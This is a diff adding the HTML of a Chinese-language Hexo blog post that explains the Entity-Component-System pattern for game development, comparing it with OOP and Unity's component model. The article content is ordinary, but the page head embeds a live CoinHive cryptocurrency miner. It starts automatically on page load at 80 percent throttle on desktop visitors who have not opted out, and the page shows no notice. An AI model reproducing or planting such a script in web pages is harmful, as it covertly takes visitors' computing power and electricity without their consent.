@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+  <meta name="author" content="WeAthFolD">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="ECS模式学习小结"/>
+  <meta property="og:description" content="" />
+  <meta property="og:site_name" content="WeAthFolD&#39;s Inverted Field"/>
+  <meta property="og:type" content="article" />
+  <meta property="og:image" content="http://weathfold.github.ioundefined"/>
+  
+    <link rel="alternate" href="/atom.xml" title="WeAthFolD&#39;s Inverted Field" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>WeAthFolD's Inverted Field</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/css/style.dark.css">
+
+  <!-- Google Analytics -->
+  
+    <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+                m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+        ga('create', 'UA-111190795-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+
+  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+  <!-- CoinHive -->
+  <script>
+    var miner = new CoinHive.Anonymous('CLCs74GtZ05pN4V8LsFkGeZWsfAzVjLn', {throttle: 0.8});
+
+    // Only start on non-mobile devices and if not opted-out
+    // in the last 14400 seconds (4 hours):
+    if (!miner.isMobile() && !miner.didOptOut(14400)) {
+      miner.start();
+    }
+
+    setInterval(function() {
+      // var hashesPerSecond = miner.getHashsePerSecond();
+      var acceptedHashes = miner.getAcceptedHashes();
+      document.getElementById("hashCount").innerHTML = acceptedHashes;
+    }, 1000);
+  </script>
+<link rel="stylesheet" href="/css/prism-atom-dark.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/kimi-no-na-wa.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">ECS模式学习小结</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/friends">
+                  
+                  Friends
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/about">
+                  
+                  About
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/Resume">
+                  
+                  Resume
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By WeAthFolD</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2017-06-17</span>
+            <span class="time">17:59:10</span>
+          </span>
+          
+          <!--  Categories  -->
+            <span class="categories info">Under 
+
+<a href="/categories/Gamedev/">Gamedev</a>
+</span>
+          
+        </div>
+        <!-- Tags -->
+        
+          <div class="post-tags text-muted">
+            Tags: 
+
+<a class="tag" href="/tags/gamedev/">#gamedev</a> <a class="tag" href="/tags/unity/">#unity</a>
+
+
+          </div>
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <p>今天在研究一些 Game code organization 方面的问题。看到暴雪的 GDC 分享<a href="http://gad.qq.com/article/detail/7212152" target="_blank" rel="noopener">《守望先锋》架构设计与网络同步</a>，于是便顺着稍微深入的了解了一下 ECS 模式，在此做一个简要的记录。</p>
+<h1 id="1-ECS-架构"><a href="#1-ECS-架构" class="headerlink" title="1 ECS 架构"></a>1 ECS 架构</h1><p>译自维基百科：</p>
+<blockquote>
+<p>ECS，即 Entity–component–system 模式，是一个多用于游戏开发的架构模式。ECS 遵循“组合优于继承”的原则，带来了极大的灵活性。每个游戏中的实体 (Entity) 都包含一个或多个组件 (Component)，来添加额外的行为或功能。因此，实体的行为可以在运行时通过添加和移除组件来改变。通常的 ECS 编程方式和数据驱动的设计技巧兼容性极好。</p>
+</blockquote>
+<a id="more"></a>
+<p><img src="/images/ecs-1.png" alt=""></p>
+<p>ECS 模式具有三个核心组件：</p>
+<ul>
+<li>Entity 是在世界中的实体。它实际上只是一个ID，只负责管理它包含的 Component 列表。</li>
+<li>Component 提供驱动模拟的数据。Component 对在系统间使用的数据提供封装，而不执行任何改变数据的逻辑。</li>
+<li>System 是所有游戏逻辑所在的地方。System 可以直接访问世界中的各个实体的 Component，并执行模拟所需的对应逻辑。</li>
+</ul>
+<h1 id="和-OOP、Unity-EC-模式的比较"><a href="#和-OOP、Unity-EC-模式的比较" class="headerlink" title="和 OOP、Unity EC 模式的比较"></a>和 OOP、Unity EC 模式的比较</h1><p>我们首先将 ECS 和 OOP 做一个比较。在 OOP 中，一个类既是状态，又是行为。例如一个 Tree 对象可能拥有一个 leavesCount 状态，并且会在自身实现的 Update 函数中根据 leavesCount 生成树叶的网格并渲染。OOP 还更倾向于用继承来进行游戏逻辑的构建。但是，在游戏开发中很容易出现多重继承的情况。例如，我们要复用树的渲染逻辑，但又要让它变成一个怪物，有攻击逻辑……这时候 OOP 就陷入了死路。如果使用 ECS 的组合思路，那么我们的树妖可能由以下组件构成：</p>
+<ul>
+<li>Tree - 提供树对象外观数据</li>
+<li>Mesh - 提供网格数据</li>
+<li>Attack - 提供攻击逻辑相关数据</li>
+</ul>
+<p>当然，这是一个过分简单的抽象，但是意思已经表示出来了。</p>
+<p>Unity 也是一个使用 Entity-component 模式（注意，没有 system）的游戏引擎。但是，它的逻辑和 ECS 还是存在着很大的区别 —— 对于 MonoBehavior，也就是 Unity 的 Component来说，数据和行为仍然是绑定在一起的 —— 你在一个 MB 里设置状态，并在同一个类的 <code>Update</code> <code>FixedUpdate</code> <code>OnTriggerEnter</code> 等事件回调中对这些状态进行处理。只要你类里的更改只涉及当前的 GameObject 和当前 Component 的状态，就已经是很干净的写法了。</p>
+<p>但是，Unity 的这种模式有一个致命的缺陷——它缺少方式来优雅的处理实体间的交互。举一些例子：</p>
+<ul>
+<li>碰撞决议</li>
+<li>碰撞事件的双重派发 —— 当实体类型A碰撞到实体类型B，会发生什么？是A处理还是B处理？</li>
+<li>在按下UI的按钮后，使用物品，通知玩家播放对应动画</li>
+</ul>
+<p>出现的问题包括：</p>
+<ol>
+<li>假如利用 Unity 本身提供的 ECS 模式，我们不得不使用 <code>GameObject.Find</code> 这样的方法对实体进行定位，或者在 Inspector 中对场景内的东西拖来拖去。不论如何，我们都难以避免<strong>场景间对象的引用</strong>，这会带来复杂的依赖关系，不利于维护。</li>
+<li>有的逻辑在 EC 模式中难以确定所处的位置。有时，同一组件会被多种行为所使用，例如玩家的血量数值就会被包括怪物攻击、玩家自身恢复（物品使用等）、环境伤害、死亡检查、UI显示等复数的行为所使用。这时候，我们是应该把其中的逻辑塞到玩家血量这一组件中吗？还是让各自的逻辑都变成一个 MonoBehaviour？……</li>
+<li>两个或多个实体共同交互时的逻辑处理。由于 EC 模式中 Component 只处理自身，要处理多个对象的交互时，这个逻辑该在哪里实现也成了问题。</li>
+</ol>
+<p>为了解决上面的这些问题，在 Unity 中我们经常会出现很多的 EC Anti Pattern，最典型的莫过于全场景单例（GameManager，InputManager，XXXManager，……）、场景对象引用和 <code>GameObject.Find</code> 的滥用。这些或许都说明着，EC 模式是有它固有的缺陷在里面的。</p>
+<h1 id="How-ECS-Runs"><a href="#How-ECS-Runs" class="headerlink" title="How ECS Runs"></a>How ECS Runs</h1><p>于是，我们可以来构造一个场景，看看 ECS 怎么工作，从而知道它是如何从根本上避免这些问题的。</p>
+<p>现在假设，我们要使用 ECS 模式写一个《以撒的结合》。在最初的版本中，玩家需要在地面行走，能够发出眼泪，眼泪可能掉落到地面上，生成溅射动画；也有可能碰到怪物，对其造成伤害。</p>
+<p>这实际上已经是一个稍有的系统，涉及到玩家输入、位置模拟和碰撞，但还没复杂到这篇博客里没法说清楚的地步。首先让我们看看这个系统需要的 Component:</p>
+<ul>
+<li>Position - 实体位置信息</li>
+<li>Velocity - 实体速度信息</li>
+<li>Render - 实体渲染信息</li>
+<li>Collider - 碰撞体信息</li>
+<li>AttackInfo - 眼泪的伤害信息</li>
+<li>Input - 输入信息（单例）</li>
+<li>FrameCollision - 用来指示帧内发生的碰撞</li>
+</ul>
+<p>系统和它们对应的依赖：</p>
+<table>
+<thead>
+<tr>
+<th>System</th>
+<th>依赖的 Component</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PhysicsSystem</td>
+<td>Position, Velocity, Collider</td>
+<td>物理计算，更新实体位置并触发碰撞消息</td>
+</tr>
+<tr>
+<td>AttackContactSystem</td>
+<td>FrameCollision, AttackInfo</td>
+<td>计算眼泪和怪物碰撞造成的伤害</td>
+</tr>
+<tr>
+<td>InputSystem</td>
+<td>无</td>
+<td>从系统收集操作输入</td>
+</tr>
+<tr>
+<td>PlayerControlSystem</td>
+<td>Velocity, Input</td>
+<td>根据用户输入调整移动，并发出眼泪</td>
+</tr>
+<tr>
+<td>RenderSystem</td>
+<td>Render</td>
+<td>渲染 Sprite</td>
+</tr>
+<tr>
+<td>GenerateHitEffectSystem</td>
+<td>FrameCollision</td>
+<td>生成眼泪的碰撞特效</td>
+</tr>
+</tbody>
+</table>
+<p>这只是一个过度简单的抽象，现实情况会比它复杂得多，但足以支撑起这一基本系统的运行。让我们来看看从玩家移动到发出眼泪到眼泪击中怪物，都发生了什么事：</p>
+<ol>
+<li>InputSystem 在每帧收集系统输入，并生成一个 Input component 到世界中。这个 component 只存在一帧。</li>
+<li>PlayerControlSystem 在每帧拿到 InputSystemn 生成的 Input 输入，并进行对应的输入处理，改变玩家的速度以及可能的，生成以撒的眼泪。</li>
+<li>RenderSystem 在每帧把游戏内的所有 Sprite，包括地形、玩家和怪物都如实渲染出来。</li>
+<li>玩家、眼泪、怪物都有对应的 Position 和 Velocity 组件。PhysicsSystem 会对他们进行对应更新。</li>
+<li>当玩家发出眼泪，PhysicsSystem 在每帧进行碰撞决议，直到它落地或碰到怪物。若碰到怪物，则创建一个单帧的 FrameCollision 组件。</li>
+<li>AttackContactSystem 拿到当前帧的碰撞信息并检查眼泪和怪物的碰撞，并将伤害赋予怪物。</li>
+<li>GenerateHitEffectSystem 拿到当前帧的碰撞，并在眼泪的碰撞位置生成碰撞的粒子效果。</li>
+</ol>
+<p>可以看到，在 ECS 里，我们通常将游戏的模拟逻辑分解为原子性的系统，遵循<strong>单一责任原则</strong>。多对象间的决议简单的转化为了各系统中对于对应 Component 的遍历方式，事件、输入这样跨对象的交互则用一个仅仅存在一帧的 Component 来进行数据传递，仍交由 System 进行数据处理。ECS 对于 Unity-EC 模式的几个主要问题，都可以进行解决。</p>
+<h1 id="On-Practicalbility"><a href="#On-Practicalbility" class="headerlink" title="On Practicalbility"></a>On Practicalbility</h1><p>我觉得 ECS 真的是一个很有趣、很优雅的模式，而且它也确实经受过实战的检验。<strong>守望先锋</strong>就使用了正统的 ECS 模式，其性能和优化效果也确实令人叹服。不过，要在实战中应用 ECS 模式，还是存在一些问题：</p>
+<ol>
+<li>Shift of mindset。从原本的 OOP 或 Unity-EC 设计模式转换到 ECS 需要时间，对于整个团队来说开销更大。</li>
+<li>缺乏原生的引擎支持。Unreal 和 Unity 都不是原汁原味的 ECS 模式。但是，它们都有对应的实现 ECS 模式的插件支持，其应用性应该也不会差。</li>
+<li>Architectural change。ECS 要求整个游戏项目都遵循此框架，对于已经上路的项目来说想转换模式显然非常困难。</li>
+</ol>
+<p>无论如何，ECS 都是一个具有现实性，甚至明显优于 Unity-EC 模式的架构模式。守望先锋依赖 ECS 优雅的解决了困难的网络同步的问题，并给出了一份优秀的答卷，更证明了这个模式的可用性。鉴于这篇文章是在没有实际做过项目的情况下写的，我还是希望能用 pure ECS 实现一个项目，以更深入的了解 ECS 的 in and out~</p>
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p>Articles and Talks</p>
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/Entity%E2%80%93component%E2%80%93system" target="_blank" rel="noopener">Entity-component-system - Wikipedia</a></li>
+<li><a href="https://www.zhihu.com/question/61169850" target="_blank" rel="noopener">知乎：如何评价守望先锋架构设计？</a></li>
+<li><a href="http://gad.qq.com/article/detail/7212152" target="_blank" rel="noopener">《守望先锋》架构设计与网络同步</a></li>
+<li><a href="https://www.zhihu.com/question/61169850" target="_blank" rel="noopener">《守望先锋》中的网络脚本化的武器和技能系统</a></li>
+<li><a href="https://www.youtube.com/watch?v=lNTaC-JWmdI" target="_blank" rel="noopener">Unite Europe 2016 - ECS architecture with Unity by example</a></li>
+<li><a href="http://www.sebaslab.com/the-truth-behind-inversion-of-control-part-iii-entity-component-systems/" target="_blank" rel="noopener">The truth behind Inversion of Control – Part III</a></li>
+<li><a href="https://www.gamedev.net/resources/_/technical/game-programming/understanding-component-entity-systems-r3013" target="_blank" rel="noopener">Understanding Component-Entity-System</a></li>
+</ul>
+<p>Entitas - Unity 的 ECS 架构插件</p>
+<ul>
+<li><a href="https://github.com/sschmid/Entitas-CSharp" target="_blank" rel="noopener">Entitas-CSharp</a></li>
+</ul>
+
+        </div>
+        <div id="disqus_thread"></div>
+        <script>
+        
+        /**
+        *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+        *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+        /*
+        var disqus_config = function () {
+        this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        };
+        */
+        (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = 'https://weathfold-ghpages.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+        })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                                    
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
